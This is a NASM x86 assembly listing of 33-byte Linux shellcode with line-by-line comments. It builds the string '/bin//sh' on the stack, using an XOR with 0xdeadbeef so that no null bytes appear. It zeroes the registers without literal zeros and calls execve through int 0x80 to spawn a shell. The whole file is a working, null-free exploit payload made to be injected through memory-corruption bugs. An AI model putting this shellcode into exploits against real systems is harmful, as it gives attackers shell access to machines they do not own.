;Shellcode size: 33 bytes
global _start

_start:
    xor eax, eax            ;Initialize eax to NULL
    push eax                ;Push a NULL Byte on the stack
    
    mov edx, 0xb6de91c0     ;Move 0xb6de91c0 into edx 
    xor edx, 0xdeadbeef     ;Xor 0xb6de91c0 with 0xdeadbeef
    push edx                ;Push '//sh' on the stack
    push 0x6e69622f         ;Push '/bin' on the stack
    mov ebx, esp            ;Initilialize ebx to "/bin/sh%00"

    push 0x1                ;Push 0x1 on the stack
    pop ecx                 ;Pop 0x1 inside ecx
    dec ecx                 ;Decrement ecx by one
                            ;Initialize ecx to NULL
    xor edx, edx            ;Initialize edx to NULL

    push 0xb                ;Push 0xb on the stack
    pop eax                 ;Pop the execve systemcall number inside eax 

    ;Systemcall details:
    ; --> execve("/bin/sh%00", NULL, NULL);
    int 0x80                ;Execute systemcall 